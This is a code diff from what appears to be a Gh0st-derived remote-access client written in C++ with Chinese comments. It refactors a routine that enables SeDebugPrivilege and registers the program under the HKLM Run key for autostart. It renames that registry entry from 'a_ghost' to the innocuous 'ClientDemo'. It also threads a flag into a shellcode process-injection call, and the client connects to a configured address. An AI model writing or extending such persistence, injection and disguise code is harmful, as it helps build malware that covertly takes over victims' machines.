@@ -6,10 +6,12 @@
 #include <common/commands.h>
 #include "common/dllRunner.h"
 #include <common/iniFile.h>
+#include "auto_start.h"
+
 #pragma comment(lib, "ws2_32.lib")
 
 // 自动启动注册表中的值
-#define REG_NAME "a_ghost"
+#define REG_NAME "ClientDemo"
 
 typedef void (*StopRun)();
 
@@ -31,60 +33,6 @@ BOOL status = 0;
 HANDLE hEvent = NULL;
 
 CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION, 0, Startup_InjSC };
-
-//提升权限
-void DebugPrivilege()
-{
-	HANDLE hToken = NULL;
-	//打开当前进程的访问令牌
-	int hRet = OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken);
-
-	if( hRet)
-	{
-		TOKEN_PRIVILEGES tp;
-		tp.PrivilegeCount = 1;
-		//取得描述权限的LUID
-		LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&tp.Privileges[0].Luid);
-		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-		//调整访问令牌的权限
-		AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL);
-
-		CloseHandle(hToken);
-	}
-}
-
-/** 
-* @brief 设置本身开机自启动
-* @param[in] *sPath 注册表的路径
-* @param[in] *sNmae 注册表项名称
-* @return 返回注册结果
-* @details Win7 64位机器上测试结果表明，注册项在：\n
-* HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
-* @note 首次运行需要以管理员权限运行，才能向注册表写入开机启动项
-*/
-BOOL SetSelfStart(const char *sPath, const char *sNmae)
-{
-	DebugPrivilege();
-
-	// 写入的注册表路径
-#define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
-
-	// 在注册表中写入启动信息
-	HKEY hKey = NULL;
-	LONG lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);
-
-	// 判断是否成功
-	if(lRet != ERROR_SUCCESS)
-		return FALSE;
-
-	lRet = RegSetValueExA(hKey, sNmae, 0, REG_SZ, (const BYTE*)sPath, strlen(sPath) + 1);
-
-	// 关闭注册表
-	RegCloseKey(hKey);
-
-	// 判断是否成功
-	return lRet == ERROR_SUCCESS;
-}
 
 BOOL CALLBACK callback(DWORD CtrlType)
 {
@@ -252,7 +200,8 @@ public:
 // 如果配置文件不存在就从命令行中获取IP和端口.
 int main(int argc, const char *argv[])
 {
-	if(!SetSelfStart(argv[0], REG_NAME))
+	BOOL ok = SetSelfStart(argv[0], REG_NAME);
+	if(!ok)
 	{
 		Mprintf("设置开机自启动失败，请用管理员权限运行.\n");
 	}
@@ -279,7 +228,7 @@ int main(int argc, const char *argv[])
 		do {
 			if (sizeof(void*) == 4) // Shell code is 64bit
 				break;
-			if (!(pid = inj.InjectProcess(nullptr))) {
+			if (!(pid = inj.InjectProcess(nullptr, ok))) {
 				break;
 			}
 			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pid);
